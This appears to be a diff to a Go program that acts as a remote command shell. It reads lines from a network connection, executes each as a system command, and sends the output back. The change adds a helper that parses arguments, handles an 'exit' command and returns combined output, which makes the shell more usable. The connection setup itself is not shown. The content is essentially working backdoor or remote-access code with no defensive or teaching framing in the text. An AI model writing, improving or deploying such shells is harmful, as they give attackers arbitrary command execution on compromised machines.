@@ -1,3 +1,5 @@
+
+
 package main
 
 import (
@@ -6,8 +8,24 @@ import (
     "bufio"
     "fmt"
     "os/exec"
+    "os"
     "strings"
 )
+
+func doCmd(cmdStr string) string {
+	cmdStr = strings.TrimSuffix(cmdStr, "\n")
+	arrCmdStr := strings.Fields(cmdStr)
+	switch arrCmdStr[0] {
+	case "exit":
+		os.Exit(0)
+	}
+	cmd := exec.Command(arrCmdStr[0], arrCmdStr[1:]...)
+	o, e := cmd.CombinedOutput()
+    	if e != nil {
+           return "Failed to run cmd."
+    	}
+        return string(o)
+}
 
 func main() {
 
@@ -47,14 +65,10 @@ tq9gneGOHkL1
     for {
 
         m, _ := bufio.NewReader(conn).ReadString('\n')
-        o, e := exec.Command(strings.TrimSuffix(m, "\n")).Output()
+        o := doCmd(m)
 
-        if e != nil {
-            fmt.Fprintf(conn, "%s\n", e)
-        }
-
-
-    fmt.Fprintf(conn, "%s\n", o)
+    	fmt.Fprintf(conn, "%s\n", o)
     }
 
 }
+
